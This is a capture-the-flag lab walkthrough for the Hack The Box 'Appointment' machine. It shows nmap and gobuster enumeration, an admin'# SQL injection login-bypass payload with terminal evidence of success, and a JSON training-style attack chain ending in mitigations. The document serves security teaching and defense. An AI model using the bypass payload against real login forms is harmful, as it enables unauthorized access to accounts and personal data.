# HTB Appointment - SQL Injection Playbook

Target theme:
- Web app authentication bypass via SQL injection
- Input validation failure (OWASP A03:2021 Injection)

Use only in authorized lab scope.

---

## 1. Objective

Move through this chain:
1. enumerate web service,
2. identify login surface,
3. validate SQLi hypothesis safely,
4. confirm access impact.

---

## 2. Core Knowledge Check

1) SQL stands for:
- Structured Query Language

2) Common SQL vulnerability:
- SQL Injection

3) PII stands for:
- Personally Identifiable Information

4) OWASP Top 10 2021 category:
- A03:2021 Injection

---

## 3. Service Enumeration

```bash
nmap -sC -sV -p 80,443 <TARGET_IP>
```

Typical finding in this box:
- Apache httpd 2.4.38 on port 80

Reference facts:
- HTTPS standard port: 443
- Web folder term: directory
- HTTP Not Found status: 404

---

## 4. Directory Enumeration

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

Gobuster mode to discover directories:
- dir

---

## 5. SQL Injection Login Bypass Hypothesis

If app builds SQL query from unsanitized username/password fields,
comment injection can bypass password checks.

Example lab payload pattern:

```text
username: admin'#
password: anything
```

Reason:
- In MySQL, # comments out remaining query text.
- If server concatenates query unsafely, password condition may be ignored.

---

## 6. Terminal Evidence (Condensed)

```text
analyst@kali:~$ nmap -sC -sV -p 80 10.129.91.209
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))

analyst@kali:~$ gobuster dir -u http://10.129.91.209 -w /usr/share/wordlists/dirb/common.txt
===============================================================
/index.php          (Status: 200)
/css                (Status: 301)
/js                 (Status: 301)
===============================================================

Browser: http://10.129.91.209
Login form found.

Input tested:
username = admin'#
password = x

Result:
Authentication bypass successful, privileged page rendered.
```

---

## 7. Analyst Reasoning Chain (Dataset-Style)

```json
{
	"scenario": "appointment_auth_bypass_sqli",
	"input_signals": [
		"Apache web app exposed on port 80",
		"Login form present",
		"Single-character SQL comment payload bypassed auth"
	],
	"attack_chain": [
		{
			"step": 1,
			"tactic": "reconnaissance",
			"technique": "Web Service Discovery",
			"confidence": 0.95,
			"evidence": "nmap detected apache httpd on 80/tcp"
		},
		{
			"step": 2,
			"tactic": "initial_access",
			"technique": "SQL Injection",
			"confidence": 0.97,
			"evidence": "admin'# payload bypassed login"
		},
		{
			"step": 3,
			"tactic": "collection",
			"technique": "Data from Information Repositories",
			"confidence": 0.8,
			"evidence": "authenticated session can access restricted data views"
		}
	],
	"hypotheses": [
		"Additional parameters may also be injectable (search, ID, sort)",
		"Role-based access controls are enforced only in SQL query logic",
		"Sensitive data exposure risk includes PII and account data"
	],
	"uncertainties": [
		"Exact DB backend schema not fully mapped",
		"Unknown if prepared statements are absent globally or only in login path",
		"No evidence yet of WAF/input anomaly monitoring"
	],
	"tool_calls": [
		{"name": "sqli_surface_mapper", "priority": "high"},
		{"name": "auth_logic_tester", "priority": "high"},
		{"name": "pii_exposure_assessor", "priority": "medium"}
	],
	"mitigation": {
		"immediate": [
			"Patch vulnerable query path with parameterized statements",
			"Invalidate active sessions potentially obtained via bypass",
			"Apply strict server-side input validation"
		],
		"hardening": [
			"Use ORM or prepared statements across all DB interactions",
			"Enforce least-privilege DB accounts for web application",
			"Add centralized secrets and credential rotation policy"
		],
		"monitoring": [
			"Alert on SQL meta-character payload patterns in auth endpoints",
			"Track repeated failed/suspicious login attempts",
			"Monitor abnormal data-access volume post-authentication"
		]
	}
}
```
